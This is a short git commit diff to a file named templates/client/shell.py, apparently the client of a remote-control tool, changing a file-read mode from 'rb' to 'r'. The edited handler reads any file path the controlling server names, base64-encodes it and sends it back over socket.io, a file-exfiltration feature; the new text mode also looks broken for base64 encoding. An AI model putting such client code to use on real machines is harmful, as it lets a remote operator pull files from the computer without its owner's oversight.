1005aa5bcc09a448d43c02af0444325f033f2e6d
Obvious Plays <111094267+ObviousTeam@users.noreply.github.com>
2024-09-10 20:02:22 -0400

    switched form rb to r

--- templates/client/shell.py
+++ templates/client/shell.py
@@ -106,7 +106,7 @@ def run(data):
     @sio.on("download_file")
     def download_file(data_new):
         if data['uuid'] == data_new['uuid']:
-            with open(data_new['file_path'], 'rb') as f:
+            with open(data_new['file_path'], 'r') as f:
                 file = f.read()
             file_ready = base64.b64encode(file).decode('utf-8')
             sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
